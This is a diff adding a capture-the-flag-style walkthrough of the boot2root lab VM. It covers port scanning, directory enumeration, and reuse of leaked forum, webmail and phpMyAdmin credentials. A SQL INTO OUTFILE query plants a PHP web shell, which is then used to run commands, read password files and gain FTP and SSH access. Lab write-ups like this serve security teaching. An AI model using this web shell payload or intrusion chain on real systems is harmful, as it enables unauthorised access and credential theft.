@@ -1,0 +1,85 @@
+PART 1 HTTPS
+
+To find boot2root's ip address range, we launch the VM in VirtualBox, then we run from host machine:
+	$ ifconfig
+	vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
+        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 65  bytes 9509 (9.5 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 
+IP_ADDRESS_RANGE = 192.168.56.1
+
+Then we use nmap on host to scan ports of boot2root:
+	$ nmap 192.168.56.0-255
+	Starting Nmap 7.92SVN ( https://nmap.org ) at 2022-10-11 15:30 CEST
+        Nmap scan report for e1r3p13.clusters.42paris.fr (192.168.56.1)
+        Host is up (0.00037s latency).
+        Not shown: 995 closed tcp ports (conn-refused)
+        PORT     STATE SERVICE
+        22/tcp   open  ssh
+        111/tcp  open  rpcbind
+        2049/tcp open  nfs
+        5900/tcp open  vnc
+        9100/tcp open  jetdirect
+
+        Nmap scan report for 192.168.56.102
+        Host is up (0.00014s latency).
+        Not shown: 994 closed tcp ports (conn-refused)
+        PORT    STATE SERVICE
+        21/tcp  open  ftp
+        22/tcp  open  ssh
+        80/tcp  open  http
+        143/tcp open  imap
+        443/tcp open  https
+        993/tcp open  imaps
+
+        Nmap done: 256 IP addresses (2 hosts up) scanned in 3.74 seconds
+
+We use a program called dirb from host to scan http/s addresses on boot2root:
+	$ dirb https://192.168.56.102 -r
+        ---- Scanning URL: https://192.168.56.102/ ----
+        + https://192.168.56.102/cgi-bin/ (CODE:403|SIZE:291)
+        ==> DIRECTORY: https://192.168.56.102/forum/
+        ==> DIRECTORY: https://192.168.56.102/phpmyadmin/
+        + https://192.168.56.102/server-status (CODE:403|SIZE:296)
+        ==> DIRECTORY: https://192.168.56.102/webmail/
+
+        -----------------
+        END_TIME: Tue Oct 11 10:11:37 2022
+        DOWNLOADED: 4612 - FOUND: 2
+In a webbrowser, we access the forum. In the forum, we analyse a topic called "Probleme login?" created by user lmezard.
+We find something that looks like a password: "!q\]Ej?*5K5cy*AJ"
+We use 
+	LOGIN = lmezard
+	PASSWORD = !q\]Ej?*5K5cy*AJ
+To log into the forum.
+From lmezard user page, we find an email address: laurie@born2sec.net
+We access the webmail with
+	LOGIN = laurie@born2sec.net
+	PASSWORD = !q\]Ej?*5K5cy*AJ
+One mail holds phpmyadmin accesses:
+	LOGIN = root
+	PASSWORD = Fg-'kKXBj87E:aJ$
+We will now use an exploit to insert a new webpage that will let us run terminal commands.
+	SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
+Then we look around using some shell commands:
+	https://192.168.56.102/forum/templates_c/backdoor.php?cmd=ls%20/home
+	LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
+	https://192.168.56.102/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
+	lmezard:G!@M6f4Eatau{sF"
+These are accesses for the FTP server.
+	ftp lmezard@192.168.56.102
+In the FTP, we find a file named fun and a README. We GET the fun file, which is a tar file, and untar it:
+	$ mv fun fun.tar
+	$ tar -xvf fun.tar
+That leaves us with a folder called ft_fun. See program get_ssh for resolution of this problem.
+Gives us credentials Iheartpwnage, after sha256:
+	PASSWORD = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+We can now ssh into boot2root:
+	LOGIN = laurie
+	PASSWORD = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+PHASE 1 COMPLETE
